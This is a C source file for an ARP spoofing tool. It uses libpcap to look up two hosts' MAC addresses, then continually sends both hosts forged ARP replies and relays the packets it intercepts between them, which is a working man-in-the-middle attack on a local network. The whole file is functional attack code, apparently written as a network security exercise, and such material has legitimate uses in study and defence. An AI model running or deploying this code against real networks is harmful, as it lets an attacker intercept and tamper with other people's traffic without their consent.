﻿#include <pthread.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "myheader.h"
#include "mytools.h"

#define SIMPLE_LOCALHOST_MAC {localhost_mac[0],localhost_mac[1],localhost_mac[2],localhost_mac[3],localhost_mac[4],localhost_mac[5]}
#define NULL_MAC "\x00\x00\x00\x00\x00\x00"
#define BR_MAC "\xFF\xFF\xFF\xFF\xFF\xFF"

/* ------ static data list ------ */
static struct pcap_pkthdr* pktData;
static uint8_t* readedData;
static SHD shareData;
static uint32_t timer;
uint8_t localhost_mac[ETHER_ADDR_LEN];
pthread_mutex_t myMutex = PTHREAD_MUTEX_INITIALIZER;

void* thread_arp_processor(char* interface);
void* thread_relay_processor(char* interface);

int main(int argc, char** argv)
{
    char errBuf[PCAP_ERRBUF_SIZE];
    char* interface;
    uint8_t threadStatus;
    uint8_t* packet;
    pcap_t* pktDescriptor;
    ETH* ethHeader;
    ARP* arpHeader;
    pthread_t threadID[2];

    if (argc != 4)
    {
          printf("Usage : arp_spoof <interface><sender ip><target ip>\n");
          return 1;
    }
    interface = argv[1];
    memcpy(localhost_mac, str_to_mac(get_interface_mac(interface)), ETHER_ADDR_LEN);
    shareData.senderIP = str_to_ip(argv[2]);
    shareData.targetIP = str_to_ip(argv[3]);
    shareData.localhostIP = str_to_ip(get_interface_ip(interface));

    ETH_ARP reqSender = {
        BR_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REQUEST),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.localhostIP),
        NULL_MAC, htonl(shareData.senderIP)
    };
    ETH_ARP reqTarget = {
        BR_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REQUEST),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.localhostIP),
        NULL_MAC, htonl(shareData.targetIP)
    };

    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);
    if (!pktDescriptor)
    {
        printf("[MainThread] Can't open %s interface resason: %s\n", interface, errBuf);
        return 1;
    }
    // Get sender and target mac address
    do{
        packet = &reqSender;
        pcap_sendpacket(pktDescriptor, packet, sizeof(ETH_ARP));
        packet = &reqTarget;
        pcap_sendpacket(pktDescriptor, packet, sizeof(ETH_ARP));

        if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
        {
            ethHeader = (ETH*)(readedData);
            if (ntohs(ethHeader->_802_3_len) == ETHERTYPE_ARP)
            {
                arpHeader = (ARP*)(readedData + sizeof(ETH));
                if (ntohs(arpHeader->libARP.ar_op) == ARPOP_REPLY)
                {
                    // Get sender & localhost mac copy to share data
                    if ((ntohl(arpHeader->dstIP) == shareData.localhostIP) &&
                            (ntohl(arpHeader->srcIP) == shareData.senderIP) )
                    {
                        memcpy(shareData.senderMAC, arpHeader->srcMAC, ETHER_ADDR_LEN);
                        memcpy(shareData.localhostMAC, arpHeader->dstMAC, ETHER_ADDR_LEN);
                    }
                    // Get target mac address copy to share data
                    if ((ntohl(arpHeader->dstIP) == shareData.localhostIP) &&
                            (ntohl(arpHeader->srcIP) == shareData.targetIP) )
                    {
                        memcpy(shareData.targetMAC, arpHeader->srcMAC, ETHER_ADDR_LEN);
                    }
                }
            }
        }
        else
        {
            printf(" [MainThread] pcap_next_ex failed.. Program will be retry on this function.\n");
        }
    }while(!memcmp(shareData.senderMAC, NULL_MAC, ETHER_ADDR_LEN) ||
           !memcmp(shareData.targetMAC, NULL_MAC, ETHER_ADDR_LEN));     // sender OR target mac is NULL?
    pcap_close(pktDescriptor);

    pthread_create(&threadID[0], NULL, thread_arp_processor, interface);
    sleep(1); // Main thread must be sleep
    pthread_create(&threadID[1], NULL, thread_relay_processor, interface);
    sleep(1);
    pthread_join(&threadID[0], (void*)&threadStatus);
    pthread_join(&threadID[1], (void*)&threadStatus);
}

// INFO: Threads are has the other pktDescriptor

void* thread_arp_processor(char* interface)
{
    char errBuf[PCAP_ERRBUF_SIZE];
    ETH* ethHeader;
    ARP* arpHeader;
    pcap_t* pktDescriptor;

    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);
    if (!pktDescriptor)
    {
        printf("[ARPThread] Can't open %s interface resason: %s\n", interface, errBuf);
        return 1;
    }
    ETH_ARP repSpoof = {
        NULL_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REPLY),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.targetIP),
        NULL_MAC, htonl(shareData.senderIP)
    };
    ETH_ARP repSpoofTarget = {
        NULL_MAC,
        SIMPLE_LOCALHOST_MAC,
        htons(ETHERTYPE_ARP),
        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REPLY),
        SIMPLE_LOCALHOST_MAC, htonl(shareData.senderIP),
        NULL_MAC, htonl(shareData.targetIP)
    };
    memcpy(repSpoof.ethHeader._802_3_dhost, shareData.senderMAC, ETHER_ADDR_LEN);
    memcpy(repSpoof.arpHeader.dstMAC, shareData.senderMAC, ETHER_ADDR_LEN);
    memcpy(repSpoofTarget.ethHeader._802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
    memcpy(repSpoofTarget.arpHeader.dstMAC, shareData.targetMAC, ETHER_ADDR_LEN);
    while(1)
    {
        if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
        {
            ethHeader = (ETH*)(readedData);
            if (ntohs(ethHeader->_802_3_len) == ETHERTYPE_ARP)
            {
                arpHeader = (ARP*)(readedData + sizeof(ETH));
                if (ntohs(arpHeader->libARP.ar_op) == ARPOP_REQUEST)
                {
                    if (!(memcmp(ethHeader->_802_3_shost, shareData.senderMAC, ETHER_ADDR_LEN)) &&
                            (ntohl(arpHeader->dstIP) == shareData.targetIP))
                    {
                        sleep(1); // wait arp load
                        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
                        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
                    }
                    if (!(memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
                            (ntohl(arpHeader->dstIP) == shareData.senderIP))
                    {
                        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
                        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
                    }
                }
            }
        }
        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
        sleep(1); // Set interval
    }
    pcap_close(pktDescriptor);
}
void* thread_relay_processor(char* interface)
{
    pcap_t* pktDescriptor;
    ETH* ethHeader;
    IP* ipHeader;
    char errBuf[PCAP_ERRBUF_SIZE];

    pktDescriptor = pcap_open_live(interface, MAX_SNAP_LEN, NP_MODE, TIME_OUT, errBuf);

    if (!pktDescriptor)
    {
        printf(" [RelayThread] Can't open %s interface resason: %s\n", interface, errBuf);
    }
    while(1)
    {
        if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
        {
            ethHeader = (ETH*)(readedData);

            if(ntohs(ethHeader->_802_3_len) == ETHERTYPE_IP)
            {
                ipHeader = (IP*)(readedData+sizeof(ETH));
                if (!memcmp(ethHeader->_802_3_shost, shareData.senderMAC, ETHER_ADDR_LEN) &&
                    !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) && // Is packet come to me?
                    (ntohl(ipHeader->ip_src.s_addr) == shareData.senderIP) &&
                    (ntohl(ipHeader->ip_dst.s_addr) != shareData.localhostIP)) // Is not me?
                {
                    memcpy(ethHeader->_802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
                    memcpy(ethHeader->_802_3_shost, shareData.localhostMAC, ETHER_ADDR_LEN);
                    pcap_sendpacket(pktDescriptor, readedData, pktData->len);
                }
                if (!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN) &&
                    !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) &&
                    (ntohl(ipHeader->ip_dst.s_addr) == shareData.senderIP) )
                {
                    memcpy(ethHeader->_802_3_shost, shareData.localhostMAC, ETHER_ADDR_LEN);
                    memcpy(ethHeader->_802_3_dhost, shareData.senderMAC, ETHER_ADDR_LEN);
                    pcap_sendpacket(pktDescriptor, readedData, pktData->len);
                }
            }
        }
        // Don't use sleep, packet send fail.
    }
    pcap_close(pktDescriptor);
}
